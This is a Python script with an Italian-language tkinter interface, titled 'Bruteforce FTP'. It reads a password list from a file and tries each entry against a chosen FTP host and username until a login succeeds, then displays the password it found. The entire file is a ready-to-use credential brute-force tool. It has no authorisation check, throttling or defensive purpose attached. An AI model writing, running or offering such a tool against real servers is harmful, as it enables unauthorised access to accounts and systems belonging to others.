import ftplib
import tkinter as tk
from tkinter import messagebox
from tkinter import filedialog


def brute_force_ftp(host, username, password_list):
    try:
        ftp = ftplib.FTP(host)
        for password in password_list:
            try:
                ftp.login(user=username, passwd=password.strip())
                return f"Password trovata: {password.strip()}"
            except ftplib.error_perm:
                continue
        return "Password non trovata."
    except Exception as e:
        return f"Errore: {str(e)}"


def start_bruteforce():
    host = entry_host.get()
    username = entry_username.get()
    password_file = entry_password_file.get()

    try:
        with open(password_file, 'r') as f:
            passwords = f.readlines()
            result = brute_force_ftp(host, username, passwords)
            messagebox.showinfo("Risultato", result)
    except FileNotFoundError:
        messagebox.showerror("Errore", "File delle password non trovato.")


def select_file():
    file_path = filedialog.askopenfilename(title="Seleziona il file delle password",
                                           filetypes=(("Text files", "*.txt"), ("All files", "*.*")))
    if file_path:
        entry_password_file.delete(0, tk.END)  # Pulisci il campo precedente
        entry_password_file.insert(0, file_path)  # Inserisci il percorso del file selezionato


# Creazione dell'interfaccia grafica
root = tk.Tk()
root.title("Bruteforce FTP ♋")

tk.Label(root, text="Host FTP:").grid(row=0)
tk.Label(root, text="Username:").grid(row=1)
tk.Label(root, text="File delle password:").grid(row=2)

entry_host = tk.Entry(root)
entry_username = tk.Entry(root)
entry_password_file = tk.Entry(root)

entry_host.grid(row=0, column=1)
entry_username.grid(row=1, column=1)
entry_password_file.grid(row=2, column=1)

tk.Button(root, text="Avvia Bruteforce", command=start_bruteforce).grid(row=3, column=1)
tk.Button(root, text="Seleziona File", command=select_file).grid(row=2, column=2)  # Pulsante per selezionare il file

root.mainloop()